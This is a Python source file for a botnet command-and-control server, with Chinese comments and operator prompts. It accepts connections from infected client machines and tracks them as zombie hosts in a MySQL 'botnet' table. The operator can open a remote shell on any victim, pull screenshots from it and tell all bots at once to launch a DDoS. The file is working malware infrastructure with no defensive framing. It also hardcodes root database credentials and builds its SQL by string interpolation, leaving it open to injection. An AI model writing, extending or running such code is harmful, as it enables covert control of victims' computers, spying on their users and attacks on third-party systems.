import os
import sys
from socket import *
from threading import Thread
import MySQLdb
import time

ip = "192.168.10.1"
port = 80
client_list = []
client_addr_list = []
client_username_list = []


def data_list():
    return client_list, client_addr_list, client_username_list


def connect_mysql():
    db = MySQLdb.connect(host="localhost", user="root", password="123456", database="botnet", charset='utf8')
    cursor = db.cursor()
    return cursor, db


def initialize_mysql():
    sql = f"UPDATE CLIENT SET status='不在线' "
    cursor, db = connect_mysql()
    cursor.execute(sql)
    db.commit()


def insert_mysql():
    index = len(client_addr_list) - 1
    create_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    sql = f"""INSERT INTO client(ip,
         status,online_time,username)
         VALUES ("{client_addr_list[index][0]}", '在线','{create_time}','{client_username_list[index]}')"""
    cursor, db = connect_mysql()
    cursor.execute(sql)
    db.commit()


def update_time_mysql(mysql_ip):
    create_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    sql = f"UPDATE CLIENT SET online_time = '{create_time}',status='在线' where ip ='{mysql_ip}' "
    cursor, db = connect_mysql()
    cursor.execute(sql)
    db.commit()


def update_status_mysql(mysql_ip):
    sql = f"UPDATE CLIENT SET status = '不在线' where ip ='{mysql_ip}' "
    cursor, db = connect_mysql()
    cursor.execute(sql)
    db.commit()


def update_status_online_mysql(mysql_ip):
    sql = f"UPDATE CLIENT SET status = '在线' where ip ='{mysql_ip}' "
    cursor, db = connect_mysql()
    cursor.execute(sql)
    db.commit()


def update_status_offline_mysql():
    sql = f"UPDATE CLIENT SET status = '不在线' "
    cursor, db = connect_mysql()
    cursor.execute(sql)
    db.commit()


def get_mysql():
    sql = "SELECT * FROM client"
    cursor, db = connect_mysql()
    cursor.execute(sql)
    results = cursor.fetchall()
    return results


# 连接客户端
def connect():
    mysql_ip_list = []
    s = socket(AF_INET, SOCK_STREAM)
    # print("ip, port: ", ip, port)
    s.bind((ip, int(port)))
    while True:
        s.listen(100)
        print("[*]服务器监听中")
        c, addr = s.accept()
        # print("c, addr:", c, addr)
        key_username = c.recv(2048).decode('utf-8')
        # print("key_username:", key_username)
        if key_username.split(" ")[0] == "freet":
            username = key_username.split(" ")[1]
            # 保存客户端信息
            client_list.append(c)
            client_addr_list.append(addr)
            client_username_list.append(username)
            print("[*]提示:" + username + ' ' + addr[0] + ":" + str(addr[1]) + "上线")
            mysql_client_list = get_mysql()
            # print("mysql_client_list:", mysql_client_list)
            for i in mysql_client_list:
                mysql_ip = i[1]
                mysql_ip_list.append(mysql_ip)
            if addr[0] in mysql_ip_list:
                update_time_mysql(addr[0])
            else:
                insert_mysql()


# 客户端shell操作
def client_shell(client, addr):
    while True:
        user_cmd = input(f'[{addr}]>>')
        if user_cmd == 'exit':
            client.send(user_cmd.encode('utf-8'))
            break
        elif user_cmd == 'screen shoot':
            file_path = os.getcwd()
            client.send('screen shoot'.encode('utf-8'))
            file = open(f"{file_path}\\static\\screen\\{addr}.png", 'wb')
            print("[*]正在接受图片,请等待！")
            while True:
                # 指定最大接收量
                data = client.recv(4024)
                file.write(data)
                if not data:
                    break
            print("[*]接受图片完成!")
            file.close()
            client.close()
            break
        else:
            client.send(user_cmd.encode('utf-8'))
            data = client.recv(10000).decode('utf-8', "ignore")
            print(data)


# 服务端shell命令控制
def server_shell(a_cmd):
    global ip
    global port
    initialize_mysql()
    if a_cmd == "sessions":
        print("ok")
        print(client_list)
        b = 0
        for real_client in client_list:
            try:
                real_client.send('sessions'.encode('utf-8'))
                real_client.recv(10000).decode('utf-8', "ignore")
                update_status_online_mysql(client_addr_list[b][0])
            except:
                update_status_mysql(client_addr_list[b][0])
                del client_list[b]
                del client_addr_list[b]
    else:
        while True:
            cmd = input('blaze(lif314)>')
            # 检测连接的客户端
            if cmd == "exploit":
                t = Thread(target=connect)
                t.setDaemon(True)
                t.start()
            elif cmd.split(' ')[0] == 'set' and cmd.split(' ')[1] == 'lhost':
                ip = cmd.split(' ')[2]
            elif cmd.split(' ')[0] == 'set' and cmd.split(' ')[1] == 'lport':
                port = cmd.split(' ')[2]
            elif cmd == 'sessions':
                b = 0
                for real_client in client_list:
                    try:
                        real_client.send('sessions'.encode('utf-8'))
                        real_client.recv(10000).decode('utf-8', "ignore")
                        update_status_online_mysql(client_addr_list[b][0])
                    except:
                        update_status_mysql(client_addr_list[b][0])
                        del client_list[b]
                        del client_addr_list[b]
                mysql_client_list = get_mysql()
                index = 0
                print("[*]总肉鸡数量:" + str(len(mysql_client_list)))
                print('[*]当前在线肉鸡数量:' + str(len(client_list)))
                print('-' * 79)
                for i in range(len(client_list)):
                    print(
                        "ID:" + str(index) + ' ' * 3 + client_username_list[index] + ' ' * 3 + client_addr_list[index][
                            0])
                    index = index + 1
                    print('-' * 79)
            elif cmd.split(' ')[0] == 'shell':
                shell_num = int(cmd.split(' ')[1])
                client_shell(client_list[shell_num], client_addr_list[shell_num][0])
            elif cmd.split(' ')[0] == "ddos":
                for i in client_list:
                    i.send(cmd.encode('utf-8'))
                    data = i.recv(2048).decode('utf-8')
                    print(data)
            elif cmd == 'exit':
                update_status_offline_mysql()
                exit()
            else:
                print("[-]错误命令,请查看说明文档!")


if __name__ == '__main__':
    try:
        a_cmd = sys.argv[1]
        server_shell(a_cmd)
    except:
        server_shell("1")
